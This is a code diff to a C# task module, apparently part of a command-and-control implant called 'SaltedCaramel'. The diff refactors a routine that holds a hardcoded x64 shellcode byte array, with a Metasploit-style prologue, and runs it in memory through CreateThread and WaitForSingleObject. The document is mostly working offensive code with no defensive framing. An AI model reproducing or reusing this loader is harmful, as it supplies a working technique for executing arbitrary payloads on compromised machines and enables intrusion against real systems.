@@ -7,6 +7,14 @@ namespace SaltedCaramel.Tasks
     {
         public static void Execute(SCTask task)
         {
+            if(LoadShellcode())
+            {
+                task.status = "complete";
+                task.message = "Shellcode loaded.";
+            }
+        }
+        public static bool LoadShellcode()
+        {
             byte[] shellcode = new byte[294] {
             0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
             0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
@@ -42,7 +50,7 @@ namespace SaltedCaramel.Tasks
 
             hThread = Win32.Kernel32.CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
             Win32.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
-            task.status = "complete";
+            return true;
         }
     }
 }
